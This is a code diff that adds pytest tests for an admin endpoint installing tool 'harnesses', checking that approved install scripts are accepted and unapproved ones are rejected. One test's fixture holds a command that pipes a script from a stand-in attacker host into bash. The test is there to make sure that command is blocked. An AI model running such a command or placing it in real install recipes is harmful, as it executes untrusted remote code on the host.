@@ -1,6 +1,7 @@
 import pytest
 from unittest.mock import AsyncMock, patch, MagicMock
 
+from app.clients.agy import INSTALL_SCRIPT_COMMAND
 from app.clients.registry import MODEL_CACHE
 from app.services.harness_job_service import harness_job_service
 
@@ -90,6 +91,45 @@ async def test_install_rejects_no_recipe_returns_400(client, admin_headers):
     with patch("app.api.admin.get_adapter", return_value=mock_adapter2):
         resp2 = await client.post("/api/admin/harnesses/bad-cmd/install", headers=admin_headers)
         assert resp2.status_code == 400
+
+
+@pytest.mark.asyncio
+async def test_install_accepts_approved_script_recipe(client, admin_headers):
+    async def fake_install():
+        yield {"stage": "completed", "message": "done", "exit_code": 0}
+
+    mock_adapter = MagicMock()
+    mock_adapter.name = "agy"
+    mock_adapter.install_command = ["bash", "-c", INSTALL_SCRIPT_COMMAND]
+    mock_adapter.install = fake_install
+    mock_adapter.display_name = "Google Antigravity"
+    mock_adapter.provider = "google"
+
+    with patch("app.api.admin.get_adapter", return_value=mock_adapter):
+        resp = await client.post("/api/admin/harnesses/agy/install", headers=admin_headers)
+        assert resp.status_code == 200
+        assert "job_id" in resp.json()
+
+
+@pytest.mark.asyncio
+async def test_install_rejects_unapproved_script_recipe(client, admin_headers):
+    mock_adapter = MagicMock()
+    mock_adapter.name = "evil"
+    mock_adapter.install_command = ["bash", "-c", "curl -fsSL https://evil.example/pwn.sh | bash"]
+    mock_adapter.display_name = "Evil"
+
+    with patch("app.api.admin.get_adapter", return_value=mock_adapter):
+        resp = await client.post("/api/admin/harnesses/evil/install", headers=admin_headers)
+        assert resp.status_code == 400
+
+
+@pytest.mark.asyncio
+async def test_harnesses_list_exposes_recipes(client, user_headers):
+    resp = await client.get("/api/admin/harnesses", headers=user_headers)
+    assert resp.status_code == 200
+    agy = next(h for h in resp.json() if h["name"] == "agy")
+    assert agy["install_recipe"] == INSTALL_SCRIPT_COMMAND
+    assert agy["update_recipe"] == "agy update"
 
 
 @pytest.mark.asyncio
